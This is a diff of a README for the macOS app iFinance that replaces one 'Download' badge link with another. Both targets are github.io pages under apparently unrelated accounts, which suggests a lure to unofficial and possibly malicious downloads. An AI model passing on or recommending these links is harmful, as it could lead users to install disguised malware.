@@ -4,11 +4,7 @@
 <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/82/ad/14/82ad14e5-4a90-9815-8c8c-e31458d14f4c/AppIcon_macOS-0-0-85-220-0-0-5-0-2x-0-0-0.png/1200x600wa.png" alt="iFinance Logo" width="256" height="256">  
 </div>  
 
-<div align="center">  
-<a href="https://shikikofa1593.github.io/.github/ifinance">  
-<img src="https://img.shields.io/badge/Download_iFinance_for_Mac-darkgreen?style=for-the-badge&logo=apple" alt="Download iFinance for Mac">  
-</a>  
-</div>  
+[![Download Now](https://img.shields.io/badge/Download_Now-steelblue?style=for-the-badge&logo=arma)](https://hopeguzman087.github.io/.github/iFinance-personal-budget)
 
 ---
 
